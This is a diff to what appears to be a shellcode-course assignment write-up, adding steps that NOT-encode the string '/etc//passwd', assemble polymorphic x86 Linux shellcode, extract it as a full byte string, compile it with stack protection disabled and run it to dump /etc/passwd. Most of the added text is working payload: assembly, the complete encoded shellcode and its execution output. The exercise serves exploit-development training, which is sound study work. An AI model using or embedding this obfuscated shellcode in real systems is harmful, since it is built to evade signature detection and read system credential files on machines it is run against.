@@ -37,3 +37,84 @@ End of assembler dump.
 (gdb)
 
 Step 2:
+Encode few pay load with simple NOT encoder. We we perfrom NOT encoder for following payload(or shellcode):
+
+shellcode = "\x74\x61\x63\x2f"
+shellcode +="\x64\x77\x73\x73"
+shellcode +="\x61\x70\x2f\x2f"
+
+Output of the simple NOT encoder is as below:
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# python notencoder.py
+Encoded shellcode ...
+\x8b\x9e\x9c\xd0\x9b\x88\x8c\x8c\x9e\x8f\xd0\xd0
+0x8b,0x9e,0x9c,0xd0,0x9b,0x88,0x8c,0x8c,0x9e,0x8f,0xd0,0xd0,
+Len: 12
+
+Step 3:
+Prepare the polymorphic Shellcodes(modified) as per SLAE Assignment # 6, here our file name is Assignment6-2.nasm
+
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# nasm -f elf Assignment6-2.nasm
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# ld -o Assignment6-2 Assignment6-2.o
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# objdump -D Assignment6-2 -M intel
+
+Assignment6-2:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 31                   jmp    8048093 <Assignment6_2>
+
+08048062 <final_shellcode>:
+ 8048062:       52                      push   edx
+ 8048063:       68 d0 9c 9e 8b          push   0x8b9e9cd0
+ 8048068:       f7 14 24                not    DWORD PTR [esp]
+ 804806b:       68 2f 62 69 6e          push   0x6e69622f
+ 8048070:       89 e3                   mov    ebx,esp
+ 8048072:       52                      push   edx
+ 8048073:       68 8c 8c 88 9b          push   0x9b888c8c
+ 8048078:       f7 14 24                not    DWORD PTR [esp]
+ 804807b:       68 d0 d0 8f 9e          push   0x9e8fd0d0
+ 8048080:       f7 14 24                not    DWORD PTR [esp]
+ 8048083:       68 2f 65 74 63          push   0x6374652f
+ 8048088:       89 e1                   mov    ecx,esp
+ 804808a:       b0 0b                   mov    al,0xb
+ 804808c:       52                      push   edx
+ 804808d:       51                      push   ecx
+ 804808e:       53                      push   ebx
+ 804808f:       89 e1                   mov    ecx,esp
+ 8048091:       cd 80                   int    0x80
+
+08048093 <Assignment6_2>:
+ 8048093:       31 db                   xor    ebx,ebx
+ 8048095:       31 c9                   xor    ecx,ecx
+ 8048097:       f7 e1                   mul    ecx
+ 8048099:       e8 c4 ff ff ff          call   8048062 <final_shellcode>
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2#
+
+Step 4: 
+Obtain the polymorphic Shellcodes(modified) for this Assignment6-2.nasm
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# objdump -d ./Assignment6-2|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x31\x52\x68\xd0\x9c\x9e\x8b\xf7\x14\x24\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x8c\x8c\x88\x9b\xf7\x14\x24\x68\xd0\xd0\x8f\x9e\xf7\x14\x24\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80\x31\xdb\x31\xc9\xf7\xe1\xe8\xc4\xff\xff\xff"
+
+Step 5:
+Compile the shellcode into shellcode2.c and execute into the system.
+
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# gcc -fno-stack-protector -z execstack shellcode2.c -o Assignment6-2_polyshell
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.2# ./Assignment6-2_polyshell
+Shellcode Length:  62
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
